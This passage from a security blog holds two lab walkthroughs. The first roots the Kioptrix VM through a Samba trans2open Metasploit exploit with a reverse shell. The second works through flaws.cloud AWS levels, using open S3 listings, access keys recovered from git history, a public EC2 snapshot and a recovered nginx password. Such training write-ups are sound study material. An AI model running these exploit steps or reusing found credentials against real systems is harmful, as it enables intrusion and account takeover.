usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over TCP Port 139.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ─[atom@atom-vmwarevirtualplatform]─[~/Desktop] └──╼ $nmap -sC -p 139,445 -sV 192.168.132.129 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 10:30 IST Nmap scan report for 192.168.132.129 Host is up (0.00092s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) 445/tcp closed microsoft-ds Host script results: |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) |_smb2-time: Protocol negotiation failed (SMB2) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds   From the result we will came to know about on port 139 samba used but still we don\u0026rsquo;t know about its version\n1 2 3 4 5 6 7 8 9 10 11  ┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop] └──╼ $nmap -p 139 -sV --script vulners 192.168.132.129 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 10:33 IST Nmap scan report for 192.168.132.129 Host is up (0.00095s latency). PORT STATE SERVICE VERSION 139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds   let’s we use Metasploit scanner to find version\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  ┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop] └──╼ $msfconsole _ _ / \\  /\\  __ _ __ /_/ __ | |\\  / | _____ \\ \\  ___ _____ | | / \\ _ \\ \\ | | \\/| | | ___\\ |- -| /\\  / __\\ | -__/ | || | || | |- -| |_| | | | _|__ | |_ / -\\ __\\ \\  | | | | \\__/| | | |_ |/ |____/ \\___\\/ /\\ \\\\___/ \\/ \\__| |_\\  \\___\\  =[ metasploit v6.1.39-dev ] + -- --=[ 2214 exploits - 1171 auxiliary - 396 post ] + -- --=[ 616 payloads - 45 encoders - 11 nops ] + -- --=[ 9 evasion ] Metasploit tip: When in a module, use back to go back to the top level prompt [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; search smb_version Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/smb/smb_version normal No SMB Version Detection Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version [msf](Jobs:0 Agents:0) \u0026gt;\u0026gt; use 0 [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) \u0026gt;\u0026gt; set RHOST 192.168.132.129 RHOST =\u0026gt; 192.168.132.129 [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) \u0026gt;\u0026gt; run [*] 192.168.132.129:139 - SMB Detected (versions:) (preferred dialect:) (signatures:optional) [*] 192.168.132.129:139 - Host could not be identified: Unix (Samba 2.2.1a) [*] 192.168.132.129: - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) \u0026gt;\u0026gt;   finally we came to know that version info Samba 2.2.1a. search on google any public exploit available.\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) \u0026gt;\u0026gt; use exploit/linux/samba/trans2open [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) \u0026gt;\u0026gt; set RHOST 192.168.132.129 RHOST =\u0026gt; 192.168.132.129 [msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) \u0026gt;\u0026gt; show options Module options (exploit/linux/samba/trans2open): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 192.168.132.129 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 139 yes The target port (TCP) Payload options (linux/x86/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.132.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Samba 2.2.x - Bruteforce [msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) \u0026gt;\u0026gt; run [msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) \u0026gt;\u0026gt; exploit [*] Started reverse TCP handler on 192.168.132.128:4444 [*] 192.168.132.129:139 - Trying return address 0xbffffdfc... [*] 192.168.132.129:139 - Trying return address 0xbffffcfc... [*] 192.168.132.129:139 - Trying return address 0xbffffbfc... [*] 192.168.132.129:139 - Trying return address 0xbffffafc... [*] Sending stage (989032 bytes) to 192.168.132.129 [*] 192.168.132.129 - Meterpreter session 1 closed. Reason: Died [-] Meterpreter session 1 is not valid and will be closed [*] 192.168.132.129:139 - Trying return address 0xbffff9fc... [*] Sending stage (989032 bytes) to 192.168.132.129 [*] 192.168.132.129 - Meterpreter session 2 closed. Reason: Died [*] 192.168.132.129:139 - Trying return address 0xbffff8fc... [*] Sending stage (989032 bytes) to 192.168.132.129 [*] 192.168.132.129 - Meterpreter session 3 closed. Reason: Died [-] Meterpreter session 3 is not valid and will be closed [*] 192.168.132.129:139 - Trying return address 0xbffff7fc... [*] Sending stage (989032 bytes) to 192.168.132.129 [*] 192.168.132.129 - Meterpreter session 4 closed. Reason: Died   we can see that the exploit ware not executed successfully . if we look into the payload, we used staged payload linux/x86/meterpreter/reverse_tcp some times exploit will not work because of payloads, let\u0026rsquo;s try to change payload to Non-Staged  payload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  [msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) \u0026gt;\u0026gt; show payloads Compatible Payloads =================== # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 payload/generic/custom normal No Custom Payload 1 payload/generic/debug_trap normal No Generic x86 Debug Trap 2 payload/generic/shell_bind_tcp normal No Generic Command Shell, Bind TCP Inline 3 payload/generic/shell_reverse_tcp normal No Generic Command Shell, Reverse TCP Inline 4 payload/generic/ssh/interact normal No Interact with Established SSH Connection 5 payload/generic/tight_loop normal No Generic x86 Tight Loop 6 payload/linux/x86/adduser normal No Linux Add User 7 payload/linux/x86/chmod normal No Linux Chmod 8 payload/linux/x86/exec normal No Linux Execute Command 9 payload/linux/x86/meterpreter/bind_ipv6_tcp normal No Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86) 10 payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid normal No Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86) 11 payload/linux/x86/meterpreter/bind_nonx_tcp normal No Linux Mettle x86, Bind TCP Stager 12 payload/linux/x86/meterpreter/bind_tcp normal No Linux Mettle x86, Bind TCP Stager (Linux x86) 13 payload/linux/x86/meterpreter/bind_tcp_uuid normal No Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86) 14 payload/linux/x86/meterpreter/reverse_ipv6_tcp normal No Linux Mettle x86, Reverse TCP Stager (IPv6) 15 payload/linux/x86/meterpreter/reverse_nonx_tcp normal No Linux Mettle x86, Reverse TCP Stager 16 payload/linux/x86/meterpreter/reverse_tcp normal No Linux Mettle x86, Reverse TCP Stager 17 payload/linux/x86/meterpreter/reverse_tcp_uuid normal No Linux Mettle x86, Reverse TCP Stager 18 payload/linux/x86/metsvc_bind_tcp normal No Linux Meterpreter Service, Bind TCP 19 payload/linux/x86/metsvc_reverse_tcp normal No Linux Meterpreter Service, Reverse TCP Inline 20 payload/linux/x86/read_file normal No Linux Read File 21 payload/linux/x86/shell/bind_ipv6_tcp normal No Linux Command Shell, Bind IPv6 TCP Stager (Linux x86) 22 payload/linux/x86/shell/bind_ipv6_tcp_uuid normal No Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86) 23 payload/linux/x86/shell/bind_nonx_tcp normal No Linux Command Shell, Bind TCP Stager 24 payload/linux/x86/shell/bind_tcp normal No Linux Command Shell, Bind TCP Stager (Linux x86) 25 payload/linux/x86/shell/bind_tcp_uuid normal No Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86) 26 payload/linux/x86/shell/reverse_ipv6_tcp normal No Linux Command Shell, Reverse TCP Stager (IPv6) 27 payload/linux/x86/shell/reverse_nonx_tcp normal No Linux Command Shell, Reverse TCP Stager 28 payload/linux/x86/shell/reverse_tcp normal No Linux Command Shell, Reverse TCP Stager 29 payload/linux/x86/shell/reverse_tcp_uuid normal No Linux Command Shell, Reverse TCP Stager 30 payload/linux/x86/shell_bind_ipv6_tcp normal No Linux Command Shell, Bind TCP Inline (IPv6) 31 payload/linux/x86/shell_bind_tcp normal No Linux Command Shell, Bind TCP Inline 32 payload/linux/x86/shell_bind_tcp_random_port normal No Linux Command Shell, Bind TCP Random Port Inline 33 payload/linux/x86/shell_reverse_tcp normal No Linux Command Shell, Reverse TCP Inline 34 payload/linux/x86/shell_reverse_tcp_ipv6 normal No Linux Command Shell, Reverse TCP Inline (IPv6)   previously we used No 16 payload, we are going to changer payload to No 33 payload/linux/x86/shell_reverse_tcp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  [msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) \u0026gt;\u0026gt; set payload payload/linux/x86/shell_reverse_tcp payload =\u0026gt; linux/x86/shell_reverse_tcp [msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) \u0026gt;\u0026gt; exploit [*] Started reverse TCP handler on 192.168.132.128:4444 [*] 192.168.132.129:139 - Trying return address 0xbffffdfc... [*] 192.168.132.129:139 - Trying return address 0xbffffcfc... [*] 192.168.132.129:139 - Trying return address 0xbffffbfc... [*] 192.168.132.129:139 - Trying return address 0xbffffafc... [*] 192.168.132.129:139 - Trying return address 0xbffff9fc... [*] 192.168.132.129:139 - Trying return address 0xbffff8fc... [*] 192.168.132.129:139 - Trying return address 0xbffff7fc... [*] 192.168.132.129:139 - Trying return address 0xbffff6fc... [*] Command shell session 9 opened (192.168.132.128:4444 -\u0026gt; 192.168.132.129:32817 ) at 2022-05-31 11:37:59 +0530 [*] Command shell session 10 opened (192.168.132.128:4444 -\u0026gt; 192.168.132.129:32818 ) at 2022-05-31 11:38:00 +0530 [*] Command shell session 11 opened (192.168.132.128:4444 -\u0026gt; 192.168.132.129:32819 ) at 2022-05-31 11:38:02 +0530 [*] Command shell session 12 opened (192.168.132.128:4444 -\u0026gt; 192.168.132.129:32820 ) at 2022-05-31 11:38:03 +0530 whoami root hostname kioptrix.level1   See you on the next Blog, Happy hacking\u0026hellip;\r ","description":" This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.","id":4,"section":"posts","tags":["samba","OpenLuck","OpenFuck","Trance2open","CVE-ID-2002-0082","CVE-ID-2003-0201"],"title":"Vulnhub - Kioptrix Level 1","uri":"https://fromzerotoonee.github.io/en/posts/vulnhub-kioptrix-level-1/"},{"content":"Hi Hackers Welcome Back ..\nToday we are going to look into flaws.cloud it is a set of CTF-like challenges that teach you common security issues in AWS accounts. The game is about breaking into a real AWS account by exploiting badly crafted account permissions. It has 6 levels, we are going to look one by one\nlet’s start with level 1.\nLevel 1 This level is buckets of fun. See if you can find the first sub-domain.\nNeed a hint? Visit Hint 1\nflaws.cloud is hosted on AWS which we found on Scope of this ctf . when you hear a name bucket in aws it refers to s3 storage bucket,\nlet us try to find subdomain we need to know about target domain ip and DNS records we are going to use tool called nslookup\nso what is nslookup ?\nnslookup is the name of a program that lets an Internet server administrator or any computer user enter a host name (for example, \u0026ldquo;whatis.com\u0026rdquo;) and find out the corresponding IP address or domain name system ( DNS ) record. The user can also enter a command for it to do a reverse DNS lookup and find the host name for an IP address that is specified\n1 2 3 4 5 6 7 8 9 10  ubuntu@ubuntu-2204:~$ nslookup flaws.cloud Server:\t127.0.0.53 Address:\t127.0.0.53#53 Non-authoritative answer: Name:\tflaws.cloud Address: 52.218.177.66 ubuntu@ubuntu-2204:~$ nslookup 52.218.177.66 66.177.218.52.in-addr.arpa\tname = s3-website-us-west-2.amazonaws.com.   we can now sure that the target domain is hosted on AWS s3 bucket and target ip belongs to s3-website-us-west-2.amazonaws.com domain\nthe web page flaws.cloud is hosted as a static website on S3 bucket in region “us-west-2”, which is region US West (Oregon). This is a great way to host a static site, similar to hosting one via github pages (our blog site is also hosted on github pages). Some interesting facts about S3 hosting: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud). Also, S3 buckets are a global name space, meaning two people cannot have buckets with the same name. The result of this is you could create a bucket named microsoft.com and microsoft would never be able host their main site via S3 hosting.\nVisiting 52.218.177.66 the ip address on web, your browser will direct you to https://aws.amazon.com/s3/ So you know flaws.cloud is hosted as an S3 bucket.\nwe can then run:\n1 2 3 4  nslookup 52.218.177.66 # Returns: # Non-authoritative answer: # 255.184.231.54.in-addr.arpa name = s3-website-us-west-2.amazonaws.com   So we know it\u0026rsquo;s hosted in the AWS region us-west-2\nSide note (not useful for this game): All S3 buckets, when configured for web hosting, are given an AWS domain you can use to browse to it without setting up your own DNS. In this case, flaws.cloud can also be visited by going to http://flaws.cloud.s3-website-us-west-2.amazonaws.com/\nan AWS S3 static site, . A common misconfiguration for web servers is directory listing if it is misconfigured then unauthenticated users are granted permissions to list a bucket. This may reveal sensitive content, like the link to the next level.\nRegion and bucket name are enough to list the bucket. We use the AWS command line client for it. To make an unauthenticated request, use the flag “–no-sign-request”.\ninstall aws cli\n1 2 3 4 5 6 7 8 9 10 11 12 13  # For Debian and Ubuntu Devices apt install python-pip\t#python 2 apt install python3-pip\t#python 3 # For CentOS and RHEL # yum install epel-release # yum install python-pip # finally install the AWS CLI pip install awscli --upgrade --user # You can check the version by running aws --version   1 2 3 4 5 6 7 8  ubuntu@ubuntu-2204:~$ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 2017-03-13 23:00:38 2575 hint1.html 2017-03-02 23:05:17 1707 hint2.html 2017-03-02 23:05:11 1101 hint3.html 2020-05-22 14:16:45 3162 index.html 2018-07-10 12:47:16 15979 logo.png 2017-02-26 20:59:28 46 robots.txt 2017-02-26 20:59:30 1051 secret-dd02c7c.html   we can able to list some files from the list we can see that secret.html page lets try to see the content on that page\nNavigate to http://flaws.cloud/secret-dd02c7c.html\n1 2 3 4 5 6 7 8 9  _____ _ ____ __ __ _____ | || | / || |__| |/ ___/ | __|| | | o || | | ( \\_ | |_ | |___ | || | | |\\__ | | _] | || _ || ` \u0026#39; |/ \\| | | | || | | \\/ \\| |__| |_____||__|__| \\_/\\_/ \\___| Congrats! You found the secret file! Level 2 is at http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud   we got link to level 2\nLevel 2 The next level is fairly similar, with a slight twist. You\u0026rsquo;re going to need your own AWS account for this. You just need the free tier For hints, see Hint 1\nfor this level we need AWS account and IAM user, if you don’t have create it \nafter sign-up\n1 2 3 4 5 6 7 8 9  1. Open the IAM console. 2. In the navigation pane of the console, choose Users. 3. Choose your IAM user name (not the check box). 4. Choose the Security credentials tab and then choose Create access key. 5. To see the new access key, choose Show. Your credentials will look something like this: Access key ID: AKIA4********** Secret access key: iKllUgQDSJtYk************************* 6. To download the key pair, choose Download .csv file. Store the keys in a secure location. 7. Keep the keys confidential in order to protect your AWS account, and never email them. Do not share them outside your organization, even if an inquiry appears to come from AWS or Amazon.com. No one who legitimately represents Amazon will ever ask you for your secret key.   need to configure aws iam user credentials to aws cli\n1 2 3 4 5 6 7 8 9  ubuntu@ubuntu-2204:~$ aws configure AWS Access Key ID [None]: AKIA4********** AWS Secret Access Key [None]: iKllUgQDSJtYk************************* Default region name [None]: us-west-2 Default output format [None]: JSON   like previous level let’s we list if any directory\u0026rsquo;s available .\n1 2 3 4 5 6 7  ubuntu@ubuntu-2204:~$ aws s3 --profile default ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud 2017-02-26 21:02:15 80751 everyone.png 2017-03-02 22:47:17 1433 hint1.html 2017-02-26 21:04:39 1035 hint2.html 2017-02-26 21:02:14 2786 index.html 2017-02-26 21:02:14 26 robots.txt 2017-02-26 21:02:15 1051 secret-e4443fc.html   we got some files with that, the file name secret-file.html makes interest, let us dig into ```secret-e4443fc.html`` file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  ubuntu@ubuntu-2204:~/Desktop$ curl http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;flAWS\u0026lt;/title\u0026gt; \u0026lt;META NAME=\u0026#34;ROBOTS\u0026#34; CONTENT=\u0026#34;NOINDEX, NOFOLLOW\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { font-family: Andale Mono, monospace; } :not(center) \u0026gt; pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; border-width: 1px; border-style: solid;} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body text=\u0026#34;#00d000\u0026#34; bgcolor=\u0026#34;#000000\u0026#34; style=\u0026#34;max-width:800px; margin-left:auto ;margin-right:auto\u0026#34; vlink=\u0026#34;#00ff00\u0026#34; link=\u0026#34;#00ff00\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;pre \u0026gt; _____ _ ____ __ __ _____ | || | / || |__| |/ ___/ | __|| | | o || | | ( \\_ | |_ | |___ | || | | |\\__ | | _] | || _ || ` \u0026#39; |/ \\| | | | || | | \\/ \\| |__| |_____||__|__| \\_/\\_/ \\___| \u0026lt;/pre\u0026gt; \u0026lt;h1\u0026gt;Congrats! You found the secret file!\u0026lt;/h1\u0026gt; \u0026lt;/center\u0026gt; Level 3 is at \u0026lt;a href=\u0026#34;http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud\u0026#34;\u0026gt;http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud\u0026lt;/a\u0026gt;   we got Level 3 access\nLevel 3 The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you\u0026rsquo;ll find something that will let you list what other buckets are. For hints, see Hint 1\nlike previous level let’s verify any directory listing is available or not\n1 2 3 4 5 6 7 8 9  ubuntu@ubuntu-2204:~/Desktop$ aws s3 --profile default ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ PRE .git/ 2017-02-26 19:14:33 123637 authenticated_users.png 2017-02-26 19:14:34 1552 hint1.html 2017-02-26 19:14:34 1426 hint2.html 2017-02-26 19:14:35 1247 hint3.html 2017-02-26 19:14:33 1035 hint4.html 2020-05-22 14:21:10 1861 index.html 2017-02-26 19:14:33 26 robots.txt   we got some list of hints but look carefully we got .git directory which makes some interest to look into it. for that let us download the directory\n1 2 3 4 5 6 7 8  ubuntu@ubuntu-2204:~/Desktop$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud . --no-sign-request --region us-west-2 download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint4.html to ./hint4.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/robots.txt to ./robots.txt download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint3.html to ./hint3.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/index.html to ./index.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint2.html to ./hint2.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html to ./hint1.html download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png to ./authenticated_users.png   after installing git on our system. navigate to downloaded directory and type git log\n1 2 3 4 5 6 7 8 9 10 11 12  [atom@atom-virtualbox l3]$ git log commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -\u0026gt; master) Author: 0xdabbad00 \u0026lt;scott@summitroute.com\u0026gt; Date: Sun Sep 17 09:10:43 2017 -0600 Oops, accidentally added something I shouldn\u0026#39;t have commit f52ec03b227ea6094b04e43f475fb0126edb5a61 Author: 0xdabbad00 \u0026lt;scott@summitroute.com\u0026gt; Date: Sun Sep 17 09:10:07 2017 -0600 first commit   we can see that there ware two comments, while look into the second comment Oops, accidentally added something I shouldn't have he developer or targeted user added something which is definitely don\u0026rsquo;t want other peoples to see. the good and bad thing about git is a version control we can revert back to the previous version of the document. let us see the difference between this first and second comment versions.\n1 2 3 4 5 6 7 8 9 10  ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$ git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 diff --git a/access_keys.txt b/access_keys.txt deleted file mode 100644 index e3ae6dd..0000000 --- a/access_keys.txt +++ /dev/null @@ -1,2 +0,0 @@ -access_key AKIAJ366LIPB4IJKT7SA -secret_access_key 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 ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$   we can see that developer. had accidentally put Access_key and Secret_key of user\nusing this credentials let us create new profile f3\n1 2 3 4 5  ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$ aws configure --profile f3 AWS Access Key ID : AKIAJ366LIPB4IJKT7SA AWS Secret Access Key ]: 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 Default region name [default]: us-west-2 Default output format [JSON]: text   using Newly created profile f3 list buckets\n1 2 3 4 5 6 7 8 9 10 11 12  ubuntu@ubuntu-2204:~/Desktop/Flaws.cloud/ls - 3$ aws s3api list-buckets --profile f3 BUCKETS\t2020-06-25T17:43:56.000Z\t2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud BUCKETS\t2020-06-26T23:06:07.000Z\tconfig-bucket-975426262029 BUCKETS\t2020-06-27T10:46:15.000Z\tflaws-logs BUCKETS\t2020-06-27T10:46:15.000Z\tflaws.cloud BUCKETS\t2020-06-27T15:27:14.000Z\tlevel2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud BUCKETS\t2020-06-27T15:27:14.000Z\tlevel3-9afd3927f195e10225021a578e6f78df.flaws.cloud BUCKETS\t2020-06-27T15:27:14.000Z\tlevel4-1156739cfb264ced6de514971a4bef68.flaws.cloud BUCKETS\t2020-06-27T15:27:15.000Z\tlevel5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud BUCKETS\t2020-06-27T15:27:15.000Z\tlevel6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud BUCKETS\t2020-06-28T02:29:47.000Z\ttheend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud OWNER\t0xdabbad00\td70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73   all the challenges hosted on from this buckets. we got level 4 path\nLevel 4 For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud\nIt\u0026rsquo;ll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. Need a hint? Go to Hint 1\nif we visit the given link prompt asked to enter username and password. after performing brute forced and directory listing nothing worked, we know that the site is hosted in ubuntu on nginx server which is ec2 instance. question says the snapshot made after nginx was setup on it, if we found snapshot we can download and look into nginx config ware the passwords and configurations are stored.\n we can snapshot the disk volume of an EC2 as a backup. In this case, the snapshot was made public, but we will need to find it.\nTo do this, first we need the account ID, which we can get using the AWS key from the previous level:\n1 2  ubuntu@ubuntu-2204:~/Desktop$ aws --profile f3 sts get-caller-identity 975426262029\tarn:aws:iam::975426262029:user/backup\tAIDAJQ3H5DC3LEG2BKSLC   ware f3 is the profile 3 which is configured on previous level\nUsing that command also tells you the name of the account, which in this case is named \u0026ldquo;backup\u0026rdquo;. The backups this account makes are snapshots of EC2s. Next, discover the snapshot:\n1 2 3  ubuntu@ubuntu-2204:~/Desktop$ aws --profile f3 ec2 describe-snapshots --owner-id 975426262029 SNAPSHOTS\tFalse\t975426262029\t100%\tsnap-0b49342abd1bdcb89\t2017-02-28T01:35:12.000Z\tcompleted\tstandard\tvol-04f1c039bc13ea950\t8 TAGS\tName\tflaws backup 2017.02.27   We specify the owner-id just to filter the output. For fun, run that command without the owner-id and notice all the snapshots that are publicy readable. By default snapshots are private, and we can transfer them between accounts securely by specifiying the account ID of the other account, but a number of people just make them public and forget about them it seems.\nThis snapshot is in us-west-2 You\u0026rsquo;re going to want to look in that snapshot.\nNow that we know the snapshot ID, we need to mount it. we need to do this in our own AWS account, which you can get for free.\n it take some time to start instance. point your mouse on top of instance name right click and select connect\n you can able to see the connection steps\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  ubuntu@ubuntu-2204:~/Desktop$ sudo ssh -i \u0026#34;kp-l3.pem\u0026#34; ec2-user@ec2-34-216-207-4.us-west-2.compute.amazonaws.com The authenticity of host \u0026#39;ec2-34-216-207-4.us-west-2.compute.amazonaws.com (34.216.207.4)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:rffHg5EdntpsnKxGDZc7A4ZHhIKL/lOiV5ColbyKs7s. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;ec2-34-216-207-4.us-west-2.compute.amazonaws.com\u0026#39; (ED25519) to the list of known hosts. __| __|_ ) _| ( / Amazon Linux 2 AMI ___|\\___|___| https://aws.amazon.com/amazon-linux-2/ 2 package(s) needed for security, out of 5 available Run \u0026#34;sudo yum update\u0026#34; to apply all updates. [ec2-user@ip-172-31-33-178 ~]$   1 2 3 4 5 6 7 8 9 10 11  [ec2-user@ip-172-31-33-178 ~]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT xvda 202:0 0 8G 0 disk └─xvda1 202:1 0 8G 0 part / xvdb 202:16 0 8G 0 disk └─xvdb1 202:17 0 8G 0 part [ec2-user@ip-172-31-33-178 ~]$ sudo file -s /dev/xvdb /dev/xvdb: x86 boot sector; partition 1: ID=0x83, active, starthead 0, startsector 16065, 16761118 sectors, code offset 0x63 [ec2-user@ip-172-31-33-178 ~]$ sudo mkdir /mnt/snapshot [ec2-user@ip-172-31-33-178 ~]$ sudo mount /dev/xvdb1 /mnt/snapshot/ [ec2-user@ip-172-31-33-178 ~]$   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  [ec2-user@ip-172-31-33-178 ~]$ cd /mnt/snapshot/ [ec2-user@ip-172-31-33-178 snapshot]$ ls bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var vmlinuz vmlinuz.old [ec2-user@ip-172-31-33-178 snapshot]$ cd var/www/html/ [ec2-user@ip-172-31-33-178 html]$ ls index.html robots.txt [ec2-user@ip-172-31-33-178 html]$ cat index.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;flAWS\u0026lt;/title\u0026gt; \u0026lt;META NAME=\u0026#34;ROBOTS\u0026#34; CONTENT=\u0026#34;NOINDEX, NOFOLLOW\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { font-family: Andale Mono, monospace; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body text=\u0026#34;#00d000\u0026#34; bgcolor=\u0026#34;#000000\u0026#34; style=\u0026#34;max-width:800px; margin-left:auto ;margin-right:auto\u0026#34; vlink=\u0026#34;#00ff00\u0026#34; link=\u0026#34;#00ff00\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;pre\u0026gt; _____ _ ____ __ __ _____ | || | / || |__| |/ ___/ | __|| | | o || | | ( \\_ | |_ | |___ | || | | |\\__ | | _] | || _ || ` \u0026#39; |/ \\| | | | || | | \\/ \\| |__| |_____||__|__| \\_/\\_/ \\___| \u0026lt;/pre\u0026gt; \u0026lt;h1\u0026gt;flAWS - Level 5\u0026lt;/h1\u0026gt; \u0026lt;/center\u0026gt; Good work getting in. This level is described at \u0026lt;a href=\u0026#34;http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/\u0026#34;\u0026gt;http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/\u0026lt;/a\u0026gt; [ec2-user@ip-172-31-33-178 html]$   we got level 5 access\nif we need password of the login, we already know the server of the site is nginx. the default password of the nginx is located on /etc/nginx/.htpasswd\n1 2 3  [ec2-user@ip-172-31-33-178 ~]$ cat /mnt/snapshot/etc/nginx/.htpasswd flaws:$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0 [ec2-user@ip-172-31-33-178 ~]$   note the password is hashed\nInstead of going crazy on cracking it (which would fail) you can just look around a bit. What you will find is a setup script that generated the password file. It contains the password in clear text.\n1 2  [ec2-user@ip-172-31-33-178 /]$ cat /mnt/snapshot/home/ubuntu/setupNginx.sh htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M   let’s log in using username : flaws password: nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M\n lets we move to Level 5\nLevel 5 This EC2 has a simple HTTP only proxy on it. 